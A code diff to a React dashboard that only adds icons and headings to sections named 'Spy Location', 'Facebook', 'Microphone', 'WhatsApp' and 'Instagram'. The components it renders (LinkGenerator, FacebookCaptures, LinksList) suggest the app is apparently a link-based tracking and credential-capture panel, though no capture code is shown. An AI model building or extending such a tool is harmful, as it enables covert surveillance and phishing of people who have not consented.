@@ -776,12 +776,20 @@ export default function Dashboard({ email }) {
             </>
           )}
           {active === 'Lessons' && (
-            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
+                <FaBook size={36} color="#E60033" />
+                <h2 style={{ color: '#E60033', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Lessons</h2>
+              </div>
               <LinkGenerator />
             </div>
           )}
           {active === 'Spy Location' && (
-            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
+                <FaMapMarkerAlt size={36} color="#25d366" />
+                <h2 style={{ color: '#25d366', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Spy Location</h2>
+              </div>
               <div>
                 <LinkGenerator />
                 <LinksList />
@@ -789,7 +797,11 @@ export default function Dashboard({ email }) {
             </div>
           )}
           {active === 'Facebook' && (
-            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
+                <FaFacebookF size={36} color="#1877f3" />
+                <h2 style={{ color: '#1877f3', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Facebook</h2>
+              </div>
               <div>
                 <LinkGenerator onlyFacebook />
                 <FacebookCaptures />
@@ -797,12 +809,20 @@ export default function Dashboard({ email }) {
             </div>
           )}
           {active === 'Microphone' && (
-            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
+                <FaMicrophone size={36} color="#fff" />
+                <h2 style={{ color: '#fff', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Microphone</h2>
+              </div>
               <MicrophonePlaceholder />
             </div>
           )}
           {active === 'WhatsApp' && (
-            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+            <div style={{ width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 24 }}>
+                <FaWhatsapp size={36} color="#25d366" />
+                <h2 style={{ color: '#25d366', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>WhatsApp</h2>
+              </div>
               <WhatsAppSim
                 onBack={() => setActive(null)}
                 showLoadMoreMsg={showLoadMoreMsg}
@@ -811,8 +831,10 @@ export default function Dashboard({ email }) {
             </div>
           )}
           {active === 'Instagram' && (
-            <div style={{ color: '#fff', fontSize: 22, marginTop: 40, textAlign: 'center', width: '100%', minHeight: '70vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-              <b>Instagram</b> coming soon...
+            <div style={{ color: '#fff', fontSize: 22, marginTop: 40, textAlign: 'center', width: '100%', minHeight: '70vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+              <FaInstagram size={36} color="#E1306C" />
+              <h2 style={{ color: '#E1306C', fontWeight: 700, fontSize: 24, margin: '10px 0 0 0', textAlign: 'center' }}>Instagram</h2>
+              <b style={{ marginTop: 16 }}>Instagram coming soon...</b>
             </div>
           )}
         </div>
